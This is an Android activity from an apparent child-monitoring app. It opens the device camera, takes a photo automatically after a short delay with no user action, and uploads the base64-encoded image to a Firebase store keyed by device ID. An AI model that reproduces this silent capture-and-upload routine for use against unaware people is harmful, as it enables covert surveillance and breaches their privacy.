package com.kidsguard.child;

import android.app.Activity;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Base64;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

import java.io.ByteArrayOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class CameraActivity extends Activity implements SurfaceHolder.Callback {

    private Camera camera;
    private SurfaceView surfaceView;
    private SurfaceHolder surfaceHolder;
    private boolean isFront = false;

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        surfaceView = new SurfaceView(this);
        surfaceHolder = surfaceView.getHolder();
        surfaceHolder.addCallback(this);
        setContentView(surfaceView);

        isFront = getIntent().getBooleanExtra("front", false);
    }

    @Override
    public void surfaceCreated(SurfaceHolder holder) {
        try {
            int camId = findCamera(isFront);
            if (camId < 0) camId = 0;
            camera = Camera.open(camId);
            camera.setPreviewDisplay(holder);
            camera.startPreview();

            // Take photo after short delay
            new android.os.Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    takePhoto();
                }
            }, 800);

        } catch (Exception e) {
            e.printStackTrace();
            finish();
        }
    }

    private int findCamera(boolean front) {
        int count = Camera.getNumberOfCameras();
        for (int i = 0; i < count; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (front && info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
            if (!front && info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) return i;
        }
        return -1;
    }

    private void takePhoto() {
        if (camera == null) { finish(); return; }
        try {
            camera.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera cam) {
                    try {
                        Bitmap bmp = BitmapFactory.decodeByteArray(data, 0, data.length);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        bmp.compress(Bitmap.CompressFormat.JPEG, 60, baos);
                        byte[] compressed = baos.toByteArray();
                        String b64 = Base64.encodeToString(compressed, Base64.NO_WRAP);

                        String devId = LocationService.getSafeDeviceId(CameraActivity.this);
                        String timeStr = new SimpleDateFormat("HH:mm dd/MM", Locale.getDefault())
                                .format(new Date());
                        String json = "{\"image\":\"" + b64 + "\",\"time\":\"" + timeStr + "\"}";
                        FirebaseHelper.put("devices/" + devId + "/photos/" + System.currentTimeMillis() + ".json", json);

                    } catch (Exception e) {
                        e.printStackTrace();
                    } finally {
                        releaseCamera();
                        finish();
                    }
                }
            });
        } catch (Exception e) {
            releaseCamera();
            finish();
        }
    }

    private void releaseCamera() {
        if (camera != null) {
            try { camera.stopPreview(); } catch (Exception ignored) {}
            camera.release();
            camera = null;
        }
    }

    @Override
    public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {}

    @Override
    public void surfaceDestroyed(SurfaceHolder holder) {
        releaseCamera();
    }

    @Override
    protected void onDestroy() {
        releaseCamera();
        super.onDestroy();
    }
}
